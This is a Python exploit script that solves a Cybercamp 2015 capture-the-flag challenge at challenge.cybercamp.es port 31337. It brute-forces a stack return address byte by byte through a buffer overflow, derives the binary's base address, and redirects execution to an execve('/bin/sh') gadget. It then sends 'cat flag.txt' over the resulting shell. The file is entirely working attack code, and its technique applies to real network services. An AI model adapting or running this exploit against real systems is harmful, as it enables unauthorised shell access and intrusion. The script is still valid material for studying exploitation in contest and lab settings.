#!/usr/bin/python
#
# Exploit 5
# Cybercamp 2015
# @danigargu
#

import socket
import time
import re

from struct import pack,unpack

HOST = 'challenge.cybercamp.es'
PORT =  31337

def get_connection(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip,port))
  return s

size  = 72
addr = ""
pos   = 1

# bruteforce valid ret-addr
while len(addr) < 8:
  for byte in range(0, 256):
    s = get_connection(HOST, PORT)
    s.recv(255)
    data = s.recv(255)
    s.send(chr(size+1))
    s.recv(255)

    data = "B" * (size-len(addr)) + addr + chr(byte)
    s.send(data)
    resp = s.recv(255)

    if "Thanks" in resp:
      print "Found valid byte at offset %d: 0x%x" % (size+1, byte)
      size += 1
      addr += chr(byte)
      s.close()
      break
    s.close()

base_addr = unpack("<Q", addr)[0] & 0xFFFFFFFFFFFF0000

"""
.text:0000000000000EF1   mov     edx, 0          ; envp
.text:0000000000000EF6   mov     esi, 0          ; argv
.text:0000000000000EFB   lea     rdi, path       ; "/bin/sh"
.text:0000000000000F02   call    _execve
.text:0000000000000F07   pop     rbp
"""
helper = base_addr + 0xEF1

print "Binary base addr: %s" % hex(base_addr)
print "Execve: %s" % hex(helper)

payload = "A" * 72
payload += pack("<Q", helper) # return address

s = get_connection(HOST, PORT)
s.recv(255)
data = s.recv(255)
s.send(chr(len(payload)))
s.send(payload)
time.sleep(1)
s.send("cat flag.txt\n")

print "Flag : %s" % s.recv(255)




